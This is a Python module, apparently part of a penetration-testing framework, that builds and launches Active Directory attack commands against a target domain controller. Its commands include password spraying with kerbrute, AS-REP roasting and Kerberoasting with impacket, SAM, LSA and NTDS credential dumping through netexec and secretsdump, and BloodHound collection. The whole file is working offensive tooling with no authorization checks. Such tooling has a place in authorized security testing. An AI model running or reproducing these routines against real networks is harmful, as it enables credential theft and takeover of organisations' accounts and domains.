"""
Active Directory module
CrackMapExec (netexec), kerbrute, impacket suite (GetNPUsers, GetUserSPNs, secretsdump)
"""
import threading
from .base_module import BaseModule


class ADModule(BaseModule):
    def build_cme(self, target: str, options: dict) -> list[str]:
        protocol = options.get("protocol", "smb")
        username = options.get("username", "")
        password = options.get("password", "")
        domain   = options.get("domain", "")
        action   = options.get("action", "enum")  # enum, shares, users, pass-pol, sessions, loggedon-users
        hash_val = options.get("hash", "")
        # Prefer netexec if available (successor), fall back to crackmapexec
        binary = options.get("binary", "netexec")
        cmd = [binary, protocol, target]
        if username:
            cmd.extend(["-u", username])
        if password:
            cmd.extend(["-p", password])
        elif hash_val:
            cmd.extend(["-H", hash_val])
        if domain:
            cmd.extend(["-d", domain])

        action_flags = {
            "enum":             [],
            "shares":           ["--shares"],
            "users":            ["--users"],
            "pass-pol":         ["--pass-pol"],
            "sessions":         ["--sessions"],
            "loggedon-users":   ["--loggedon-users"],
            "local-auth":       ["--local-auth"],
            "sam":              ["--sam"],
            "lsa":              ["--lsa"],
            "ntds":             ["--ntds"],
        }
        cmd.extend(action_flags.get(action, []))
        return cmd

    def build_kerbrute_userenum(self, target: str, options: dict) -> list[str]:
        domain = options.get("domain", "")
        userlist = options.get("userlist", "")
        return ["kerbrute", "userenum", "-d", domain, "--dc", target, userlist]

    def build_kerbrute_passwordspray(self, target: str, options: dict) -> list[str]:
        domain = options.get("domain", "")
        userlist = options.get("userlist", "")
        password = options.get("password", "")
        return ["kerbrute", "passwordspray", "-d", domain, "--dc", target, userlist, password]

    def build_GetNPUsers(self, target: str, options: dict) -> list[str]:
        """AS-REP Roasting"""
        domain = options.get("domain", "")
        userlist = options.get("userlist", "")
        cmd = ["impacket-GetNPUsers", f"{domain}/", "-usersfile", userlist,
               "-request", "-format", "hashcat", "-dc-ip", target]
        return cmd

    def build_GetUserSPNs(self, target: str, options: dict) -> list[str]:
        """Kerberoasting"""
        domain = options.get("domain", "")
        username = options.get("username", "")
        password = options.get("password", "")
        cmd = ["impacket-GetUserSPNs", f"{domain}/{username}:{password}",
               "-request", "-dc-ip", target]
        return cmd

    def build_secretsdump(self, target: str, options: dict) -> list[str]:
        domain = options.get("domain", "")
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        if hash_val:
            cmd = ["impacket-secretsdump", "-hashes", hash_val,
                   f"{domain}/{username}@{target}"]
        else:
            cmd = ["impacket-secretsdump", f"{domain}/{username}:{password}@{target}"]
        return cmd

    def build_bloodhound(self, target: str, options: dict) -> list[str]:
        domain = options.get("domain", "")
        username = options.get("username", "")
        password = options.get("password", "")
        cmd = ["bloodhound-python", "-d", domain, "-u", username, "-p", password,
               "-ns", target, "-c", "all"]
        return cmd

    def execute(self, target: str, options: dict, save_output: bool = False):
        tool = options.get("tool", "cme")
        builders = {
            "cme":            lambda: self.build_cme(target, options),
            "netexec":        lambda: self.build_cme(target, {**options, "binary":"netexec"}),
            "kerbrute-enum":  lambda: self.build_kerbrute_userenum(target, options),
            "kerbrute-spray": lambda: self.build_kerbrute_passwordspray(target, options),
            "GetNPUsers":     lambda: self.build_GetNPUsers(target, options),
            "GetUserSPNs":    lambda: self.build_GetUserSPNs(target, options),
            "secretsdump":    lambda: self.build_secretsdump(target, options),
            "bloodhound":     lambda: self.build_bloodhound(target, options),
        }
        cmd = builders.get(tool, builders["cme"])()
        t = threading.Thread(target=self.run_command, args=(cmd, target, save_output), daemon=True)
        t.start()
